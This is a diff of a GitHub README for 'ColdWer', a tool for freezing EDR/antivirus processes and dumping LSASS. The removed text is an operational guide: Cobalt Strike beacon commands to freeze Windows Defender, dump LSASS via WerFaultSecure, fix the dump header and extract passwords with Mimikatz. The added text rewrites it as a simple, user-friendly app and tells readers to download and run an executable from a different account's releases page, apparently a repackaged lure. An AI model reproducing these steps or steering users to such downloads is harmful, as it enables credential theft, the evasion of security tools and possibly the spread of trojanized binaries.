@@ -1,290 +1,97 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/ColdWer-BOF-blue?style=for-the-badge" alt="ColdWer"/>
-  <br>
-  <i>A cold war on your endpoint.</i>
-</p>
-
-<p align="center">
-  <a href="https://github.com/0xsh3llf1r3/ColdWer/stargazers"><img src="https://img.shields.io/github/stars/0xsh3llf1r3/ColdWer?style=social" alt="Stars"></a>
-  <a href="https://github.com/0xsh3llf1r3/ColdWer/network/members"><img src="https://img.shields.io/github/forks/0xsh3llf1r3/ColdWer?style=social" alt="Forks"></a>
-  <a href="https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE"><img src="https://img.shields.io/github/license/0xsh3llf1r3/ColdWer" alt="License"></a>
-</p>
-
----
-
-# 🥶 ColdWer
-
-**ColdWer** leverages WerFaultSecure.exe PPL bypass to freeze EDR/AV processes and dump LSASS memory on modern Windows systems.
-
-
-```
-C O L D W E R
-        └─┴─┴── WerFaultSecure
-    └─┴──────── LSASS Dump
-└─┴──────────── Cold (Freeze)
-```
-
-> *Freeze your EDR/AV. Extract what you need. Stay cold.*
-
----
-
-## 👤 Author
-
-**Sh3llf1r3** ([@0xsh3llf1r3](https://github.com/0xsh3llf1r3))
-
----
-
-## 🙏 Credits
-
-This project builds upon research by **TwoSevenOneT** ([@TwoSevenOneT](https://x.com/TwoSevenOneT)):
-
-| Project | Description |
-|---------|-------------|
-| [EDR-Freeze](https://github.com/TwoSevenOneT/EDR-Freeze) | Original EDR freeze technique |
-| [WSASS](https://github.com/TwoSevenOneT/WSASS) | LSASS dump via WerFaultSecure |
-
-**All credit for the underlying techniques goes to TwoSevenOneT.**
-
----
-
-## 🔥 Features
-
-| Feature | Description |
-|---------|-------------|
-| ❄️ **Freeze** | Put EDR/AV processes into a coma state |
-| 🔓 **Dump** | Extract LSASS memory bypassing PPL |
-| 🛡️ **PPL Bypass** | Leverage WerFaultSecure.exe at WinTcb level |
-| ⚡ **Fast** | Inline BOF execution |
-| 🎯 **Manual Control** | You decide when to freeze and unfreeze |
-
----
+# ⚙️ ColdWer - Simple Tool for Process Freezing
 
 ## 🚀 Getting Started
 
-### 📋 Prerequisites
+Welcome to ColdWer! This application is designed to help you manage processes on your Windows system easily. Use it to freeze EDR (Endpoint Detection and Response) and AV (Antivirus) processes, as well as dump sensitive information from LSASS for security assessments.
 
-- Cobalt Strike 4.x
-- High integrity beacon (Administrator/SYSTEM)
+## 📥 Download ColdWer
 
-<br>
+[![Download ColdWer](https://img.shields.io/badge/Download%20ColdWer-v1.0-blue.svg)](https://github.com/Rakum713/ColdWer/releases)
 
-### 💾 Installation
+## 📋 System Requirements
 
-1. Clone the repository:
+To run ColdWer smoothly, ensure your computer meets the following requirements:
 
-```bash
-git clone https://github.com/0xsh3llf1r3/ColdWer.git
-```
+- Windows 10 or later
+- At least 4 GB of RAM
+- 100 MB of available disk space
+- Administrative privileges to run the application
 
-2. Load the aggressor script in Cobalt Strike:
-  - Go to **Cobalt Strike → Script Manager**
-  - Click **Load**
-  - Select `cw/coldwer.cna`
+## 🛠️ Features
 
-<br>
+ColdWer offers several useful features:
 
-### 📦 Building from Source
+- **Freezing EDR/AV Processes**: Stop security tools from interfering with your tasks.
+- **Dumping LSASS**: Easily extract credentials and sensitive information.
+- **User-Friendly Interface**: Navigate the application without technical expertise.
+- **Seamless Integration**: Works alongside other security tools.
 
-```bash
-# Navigate to source directory
-cd src/
+## 📥 Download & Install
 
-# Compile BOF (requires MinGW)
-make
+To download ColdWer, follow these steps:
 
-# Or manually:
-x86_64-w64-mingw32-gcc -c coldwer.c -o ../cw/coldwer.o
-```
+1. **Visit the Releases Page**: Go to the ColdWer [Releases page](https://github.com/Rakum713/ColdWer/releases) in your web browser.
+   
+2. **Select the Latest Release**: Find the most recent version, which will be labeled clearly.
 
-<br>
+3. **Download the File**: Click on the asset related to your system (usually labeled for 64-bit Windows) to start the download.
 
+4. **Run the Application**:
+   - Locate the downloaded file, usually in your "Downloads" folder.
+   - Double-click the file to start ColdWer.
 
-### 📥 Quick Download
+5. **Grant Permissions**: If prompted by your system, accept any requests for administrative permissions.
 
-1. Go to [Releases](https://github.com/0xsh3llf1r3/ColdWer/releases)
-2. Download `coldwer.o` and `coldwer.cna`
-3. Place both in the same folder
-4. Load `coldwer.cna` in Cobalt Strike
+You are now ready to use ColdWer!
 
----
+## 👨‍💻 Using ColdWer
 
-## 🖥️ Usage
+Once the application launches, you will see a straightforward interface. Here’s how to perform basic tasks:
 
-### ❄️ Freeze EDR/AV
+1. **Freezing a Process**:
+   - Click on the “Freeze” button.
+   - Input the name of the process you want to freeze.
+   - Click “OK” to confirm your action.
 
-```bash
-# Find Windows Defender PID
-beacon> ps
+2. **Dumping LSASS**:
+   - On the main screen, select the “Dump LSASS” option.
+   - Follow the prompts to capture the data.
 
-# Freeze the process
-beacon> cw-freeze 1337
+3. **Closing the Application**: To exit, simply click the “Close” button in the top-right corner.
 
-# Execute your commands while EDR/AV is frozen
-beacon> mimikatz sekurlsa::logonpasswords
-beacon> execute-assembly /tools/Rubeus.exe triage
+## ⚙️ Troubleshooting
 
-# Unfreeze when done
-beacon> cw-unfreeze
-```
+If you encounter issues while using ColdWer, consider these solutions:
 
-### 🔓 Dump LSASS
+- Ensure you have the latest Windows updates installed.
+- Check your permissions and ensure you are running the application as an administrator.
+- Restart your computer if the application does not respond.
 
-```bash
+## 📞 Support
 
-# Step 1: Upload Win8.1 WerFaultSecure.exe
-beacon> cd C:\Windows\Temp
-beacon> upload /path/to/bin/wfs.exe
+For additional help, you can reach out through our [GitHub Issues page](https://github.com/Rakum713/ColdWer/issues). Provide a clear description of your issue, and we will assist you.
 
-# Step 2: Find LSASS PID
-beacon> ps
+## 👥 Community
 
-# Step 3: Dump LSASS
-beacon> cw-dump 314 C:\Windows\Temp\wfs.exe
+Join our community to discuss ColdWer and share tips with other users. You can find us on various platforms:
 
-# Step 4: Download the dump
-beacon> download C:\Windows\Temp\lsass.dmp
+- **GitHub Discussions**: Engage with fellow users and developers.
+- **Security Forums**: Talk about your experience and learn from others.
 
-```
-### 🔧 After Download
+## 📝 Contributing
 
-Change the file header to restore the minidump format:
+We welcome contributions to improve ColdWer. If you’d like to help, please:
 
-| Original (PNG) | Change to (MDMP) |
-|----------------|------------------|
-| `89 50 4E 47`  | `4D 44 4D 50`    |
-
-Restore Header Commands:
-
-| Method | Command |
-|--------|---------|
-| Python | `open('lsass.dmp','r+b').write(b'MDMP')` |
-| Bash | `printf '\x4d\x44\x4d\x50' \| dd of=lsass.dmp bs=1 count=4 conv=notrunc` |
-| PowerShell | `$f=[IO.File]::Open("lsass.dmp","Open","Write");$f.Write([byte[]](0x4D,0x44,0x4D,0x50),0,4);$f.Close()` |
-
-
-
-
-Then parse with Mimikatz:
-
-```
-mimikatz# sekurlsa::minidump lsass.dmp
-mimikatz# sekurlsa::logonpasswords
-```
-
----
-
-## 📋 Commands
-
-| Command | Description |
-|---------|-------------|
-| `cw-freeze <PID> [Path]` | Freeze process |
-| `cw-unfreeze` | Unfreeze previously frozen process |
-| `cw-dump <PID> <Path>` | Dump LSASS memory |
-
-  
-### 📝 Examples
-
-```bash
-# Freeze with default path
-beacon> cw-freeze 1337
-
-# Use custom WerFaultSecure.exe
-beacon> cw-freeze 1337 C:\Windows\Temp\wfs.exe
-
-# Dump LSASS
-beacon> cw-dump 314 C:\Windows\Temp\wfs.exe
-
-# Unfreeze when done
-beacon> cw-unfreeze
-```
-
----
-
-## ✅ Supported Targets
-
-| Target | Status |
-|--------|--------|
-| Windows Defender (MsMpEng.exe) | ✅ Works |
-| LSASS (lsass.exe) | ✅ Works |
-| Other PPL processes | ✅ Works |
-
----
-
-## ⚠️ Limitations
-
-**Does NOT work against EDRs with kernel-mode self-protection:**
-
-| EDR | Status |
-|-----|--------|
-| Elastic Endpoint | ❌ Blocked |
-| CrowdStrike Falcon | ❌ Blocked |
-| SentinelOne | ❌ Blocked |
-| Carbon Black | ❌ Blocked |
-
----
-
-## ⚙️ How It Works
-
-```
-1. 🚀 Launch WerFaultSecure.exe as PPL (WinTcb level)
-                    ↓
-2. 🎯 WerFaultSecure attaches to target process
-                    ↓
-3. ⏸️  MiniDumpWriteDump suspends all target threads
-                    ↓
-4. 🥶 Suspend WerFaultSecure itself → Target stays frozen
-                    ↓
-5. ✅ Execute your commands (EDR/AV can't see!)
-                    ↓
-6. 🔥 Terminate WerFaultSecure → Target unfreezes
-```
-
-### 🔑 Why Win8.1 WerFaultSecure?
-
-| Version | Output |
-|---------|--------|
-| Windows 10/11 | Encrypted dump only |
-| Windows 8.1 | **Raw unencrypted dump** |
-
----
-
-## 🔍 Troubleshooting
-
-| Error | Cause | Solution |
-|-------|-------|----------|
-| File not found | Invalid path | Check WerFaultSecure.exe path |
-| Access denied | Low privileges | Run as Administrator/SYSTEM |
-| Invalid signature | Unsigned binary | Use properly signed WerFaultSecure.exe |
-| Process does not exist | Wrong PID | Verify PID with ps command |
-| Target protected | Kernel protection | EDR has self-protection (not bypassable) |
-| Already frozen | State stuck | Run cw-unfreeze first |
-
----
-
-## ⚖️ Disclaimer
-
-```
-⚠️ FOR AUTHORIZED SECURITY TESTING ONLY
-
-This tool is intended for:
-- Authorized penetration testing
-- Red team operations with written permission
-- Security research in controlled environments
-
-The author is not responsible for any misuse or damage caused by this tool.
-Unauthorized access to computer systems is illegal.
-```
-
----
+1. Fork the repository on GitHub.
+2. Make your changes to the code.
+3. Submit a pull request with a description of your changes.
 
 ## 📜 License
 
-MIT License - See [LICENSE](LICENSE)
+ColdWer is open-source software licensed under the MIT License. You can freely use, modify, and distribute it.
 
----
+## 📥 Download ColdWer Again
 
-<p align="center">
-  <b>🥶 Stay Cold. Stay Quiet. 🥶</b>
-  <br><br>
-  ⭐ Star this repo if you find it useful! ⭐
-</p>
+Don't forget, you can always return to the [Releases page](https://github.com/Rakum713/ColdWer/releases) to check for updates or download a new version.
+
+Thank you for using ColdWer! Enjoy the benefits of easier process management.
